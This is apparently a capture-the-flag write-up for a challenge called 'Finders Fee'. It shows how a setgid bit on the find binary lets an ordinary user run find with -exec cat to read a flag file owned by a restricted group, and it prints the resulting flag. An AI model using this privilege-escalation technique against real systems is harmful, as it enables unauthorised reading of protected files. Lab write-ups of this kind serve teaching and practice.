# Finders Fee

You gotta make sure the people who find stuff are rewarded for you are rewarded well!

-----

Connecting to the instance, we can immediately attempt to find the flag based on the challenge name:

```
$ find / -type f -name *flag.txt* 2>/dev/null
/home/finder/flag.txt
```

However, we do not have `read` access to `/home/finder` as we are just `user`.

Looking at the permissions for the `find` binary, we see that it has the `s` bit set on the group permission group.

```
$ ls -l /usr/bin/find
-rwxr-sr-x 1 root finder 204264 Apr  8  2024 /usr/bin/find
```

When executed, this elevates our privileges temporarily to the `finders` group.

Running our initial `find` command and the `-exec` option allows us to read the flag:

```
$ find / -type f -name *flag.txt* 2>/dev/null -exec cat
{} \;
flag{63a10f0440218364424b20f9ddf6ad39}
```